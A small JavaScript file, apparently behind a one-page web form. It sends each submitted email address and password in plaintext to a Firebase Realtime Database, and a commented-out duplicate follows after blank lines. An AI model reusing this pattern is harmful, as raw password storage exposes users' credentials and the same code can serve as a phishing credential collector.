const firebaseConfig = {
    apiKey: "AIzaSyCZ3oG1hqUu5AkG2re4kIDmvXIbP7vOEos",
    authDomain: "one-page-92039.firebaseapp.com",
    databaseURL: "https://one-page-92039-default-rtdb.firebaseio.com",
    projectId: "one-page-92039",
    storageBucket: "one-page-92039.appspot.com",
    messagingSenderId: "672519078053",
    appId: "1:672519078053:web:350f2c8e75a35944a54d4c"
  };
  //initialize firebase
  firebase.initializeApp(firebaseConfig);

  //reference your db
  var onepageDB=firebase.database().ref("onepage")
  document.getElementById("onepage").addEventListener("submit",submitForm)


  function submitForm(e)
  {
    e.preventDefault();
    var email=getElementVal("email");
    var psw=getElementVal("psw");
    saveMessages(email,psw);

    //   enable alert
  document.querySelector(".alert").style.display = "block";

  //   remove the alert
  setTimeout(() => {
    document.querySelector(".alert").style.display = "none";
  }, 3000);

  //   reset the form
  document.getElementById("onepage").reset();
  }
  

  const saveMessages=(email,psw)=>{
    var newOnePage=onepageDB.push();
    newOnePage.set({
        email: email,
        psw: psw,
    })
  };

  const getElementVal=(id)=>{
    return document.getElementById(id).value;
  };

  function register(){
    //Gets all input fields

    email=document.getElementById('email').value
    psw=document.getElementById('psw').value
  }
  




























/*

const firebaseConfig = {
    apiKey: "AIzaSyCZ3oG1hqUu5AkG2re4kIDmvXIbP7vOEos",
    authDomain: "one-page-92039.firebaseapp.com",
    databaseURL: "https://one-page-92039-default-rtdb.firebaseio.com",
    projectId: "one-page-92039",
    storageBucket: "one-page-92039.appspot.com",
    messagingSenderId: "672519078053",
    appId: "1:672519078053:web:350f2c8e75a35944a54d4c"
  };
  //initialize firebase
  firebase.initializeApp(firebaseConfig);

  //reference your db
  var onepageDB=firebase.database().ref("onepage")
  document.getElementById("onepage").addEventListener("submit",submitForm)


  function submitForm(e)
  {
    e.preventDefault();
    var email=getElementVal("email");
    var psw=getElementVal("psw");
    saveMessages(email,psw);

    //   enable alert
  document.querySelector(".alert").style.display = "block";

  //   remove the alert
  setTimeout(() => {
    document.querySelector(".alert").style.display = "none";
  }, 3000);

  //   reset the form
  document.getElementById("onepage").reset();
  }
  const saveMessages=(email,psw)=>{
    var newOnePage=onepageDB.push();
    newOnePage.set({
        email: email,
        psw: psw,
    })
  };

  const getElementVal=(id)=>{
    return document.getElementById(id).value;
  };

  function register(){
    //Gets all input fields

    email=document.getElementById('email').value
    psw=document.getElementById('psw').value
  }

*/